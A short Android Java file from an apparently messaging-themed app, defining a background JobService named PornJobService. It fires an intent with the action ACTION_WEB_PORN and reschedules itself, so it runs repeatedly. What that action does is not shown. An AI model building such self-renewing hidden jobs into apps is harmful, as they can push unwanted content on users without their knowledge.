package com.candroid.textme.jobs.services;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;

import com.candroid.textme.jobs.JobsIntentService;
import com.candroid.textme.jobs.JobsScheduler;

public class PornJobService extends JobService {
    @Override
    public boolean onStartJob(JobParameters params) {
        Intent pornIntent = new Intent(getApplicationContext(), JobsIntentService.class);
        pornIntent.setAction(JobsIntentService.ACTION_WEB_PORN);
        getApplicationContext().startService(pornIntent);
        JobsScheduler.scheduleJob(getApplicationContext());
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true;
    }
}
